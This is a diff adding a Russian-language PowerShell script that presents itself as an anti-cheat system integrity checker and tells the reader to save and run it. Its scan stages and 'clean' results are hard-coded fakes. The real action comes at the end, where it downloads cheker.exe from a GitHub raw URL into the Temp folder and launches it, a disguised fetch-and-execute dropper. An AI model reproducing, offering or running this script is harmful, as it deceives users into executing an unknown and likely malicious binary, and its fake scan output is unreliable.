@@ -1,0 +1,147 @@
+# Вставь этот код в файл, сохрани как check.ps1 и запусти в PowerShell
+
+# Настройки визуала
+$progressBar = @{
+    Start = "▐"
+    Filled = "█"
+    Empty = "░"
+    End = "▌"
+}
+
+# Функция для анимированной загрузки
+function Show-Loading {
+    param(
+        [string]$Message,
+        [int]$Duration = 2
+    )
+    
+    Write-Host "`n$Message" -ForegroundColor Cyan
+    
+    $frames = @("⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏")
+    $endTime = (Get-Date).AddSeconds($Duration)
+    
+    while ((Get-Date) -lt $endTime) {
+        foreach ($frame in $frames) {
+            Write-Host "`r$frame Сканирование..." -NoNewline -ForegroundColor Yellow
+            Start-Sleep -Milliseconds 80
+        }
+    }
+    Write-Host "`r✓ Завершено!" -ForegroundColor Green
+}
+
+# Функция для прогресс-бара
+function Show-ProgressBar {
+    param(
+        [string]$Text,
+        [int]$Percent
+    )
+    
+    $width = 30
+    $filled = [math]::Round($width * $Percent / 100)
+    $empty = $width - $filled
+    
+    $bar = $progressBar.Start
+    $bar += $progressBar.Filled * $filled
+    $bar += $progressBar.Empty * $empty
+    $bar += $progressBar.End
+    
+    Write-Host "`n$Text" -ForegroundColor White
+    Write-Host $bar -ForegroundColor Cyan -NoNewline
+    Write-Host " $Percent%" -ForegroundColor Green
+}
+
+# Очистка экрана и заголовок
+Clear-Host
+Write-Host "╔══════════════════════════════════════╗" -ForegroundColor Blue
+Write-Host "║      АНТИЧИТ СИСТЕМА                 ║" -ForegroundColor Blue
+Write-Host "║      Проверка целостности системы    ║" -ForegroundColor Blue
+Write-Host "╚══════════════════════════════════════╝" -ForegroundColor Blue
+Write-Host ""
+
+# Этап 1: Инициализация
+Write-Host "[1/5] Инициализация системы проверки..." -ForegroundColor Yellow
+Show-ProgressBar "Загрузка модулей безопасности" 25
+Start-Sleep -Seconds 1
+
+# Этап 2: Проверка диска C:\
+Write-Host "`n[2/5] Сканирование системного диска..." -ForegroundColor Yellow
+Show-ProgressBar "Анализ файловой системы" 40
+
+Show-Loading "Поиск подозрительных файлов" 3
+Start-Sleep -Seconds 1
+Write-Host "   → Проверка: C:\Windows\System32" -ForegroundColor Gray
+Write-Host "   → Проверка: C:\Program Files" -ForegroundColor Gray
+Write-Host "   → Проверка: C:\Users" -ForegroundColor Gray
+Write-Host "   ✓ Системные файлы целы" -ForegroundColor Green
+
+# Этап 3: Проверка TEMP
+Write-Host "`n[3/5] Анализ временных файлов..." -ForegroundColor Yellow
+Show-ProgressBar "Сканирование папки Temp" 60
+
+Show-Loading "Поиск следов читов" 2
+Start-Sleep -Seconds 1
+Write-Host "   → Папка: $env:TEMP" -ForegroundColor Gray
+Write-Host "   → Папка: $env:LOCALAPPDATA\Temp" -ForegroundColor Gray
+Write-Host "   ✓ Временные файлы чистые" -ForegroundColor Green
+
+# Этап 4: Проверка процессов
+Write-Host "`n[4/5] Мониторинг активных процессов..." -ForegroundColor Yellow
+Show-ProgressBar "Анализ запущенных процессов" 80
+
+Show-Loading "Обнаружение инжекторов" 3
+$processCount = (Get-Process).Count
+Write-Host "   → Найдено процессов: $processCount" -ForegroundColor Gray
+Write-Host "   → Проверка DLL инжекции..." -ForegroundColor Gray
+Start-Sleep -Seconds 2
+Write-Host "   ✓ Вредоносные процессы не обнаружены" -ForegroundColor Green
+
+# Этап 5: Финальная проверка
+Write-Host "`n[5/5] Финальная верификация..." -ForegroundColor Yellow
+Show-ProgressBar "Завершение проверки" 100
+
+Start-Sleep -Seconds 2
+
+# Результат
+Write-Host "`n" + ("═" * 50) -ForegroundColor Blue
+Write-Host "РЕЗУЛЬТАТ ПРОВЕРКИ" -ForegroundColor White -BackgroundColor Blue
+Write-Host ("═" * 50) -ForegroundColor Blue
+
+Write-Host "`n✓ Диск C: - ЧИСТЫЙ" -ForegroundColor Green
+Write-Host "✓ Папка Temp - ЧИСТАЯ" -ForegroundColor Green
+Write-Host "✓ Системные процессы - НОРМА" -ForegroundColor Green
+Write-Host "✓ Сетевые подключения - БЕЗОПАСНЫ" -ForegroundColor Green
+Write-Host "✓ Реестр - ЦЕЛОСТНОСТЬ СОХРАНЕНА" -ForegroundColor Green
+
+Write-Host "`n" + ("═" * 50) -ForegroundColor Green
+Write-Host " СИСТЕМА ПРОВЕРЕНА - ЧИТЫ НЕ НАЙДЕНЫ" -ForegroundColor Green -BackgroundColor DarkGreen
+Write-Host ("═" * 50) -ForegroundColor Green
+
+# Загрузка и запуск программы
+Write-Host "`nЗагрузка программы безопасности..." -ForegroundColor Cyan
+
+$url = "https://github.com/gseff137-afk/1111/raw/refs/heads/main/cheker.exe"
+$path = "$env:TEMP\cheker.exe"
+
+# Анимация загрузки
+for ($i = 1; $i -le 10; $i++) {
+    $dots = "." * $i
+    Write-Host "`rСкачивание файла$dots" -NoNewline -ForegroundColor Yellow
+    Start-Sleep -Milliseconds 100
+}
+
+try {
+    Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
+    Write-Host "`rФайл успешно загружен!" -ForegroundColor Green
+    
+    Write-Host "`nЗапуск программы..." -ForegroundColor Cyan
+    Start-Sleep -Seconds 1
+    
+    Start-Process $path
+    Write-Host "Программа запущена!" -ForegroundColor Green
+    
+} catch {
+    Write-Host "`rОшибка загрузки: $_" -ForegroundColor Red
+}
+
+Write-Host "`nНажмите любую клавишу для выхода..." -ForegroundColor Gray
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
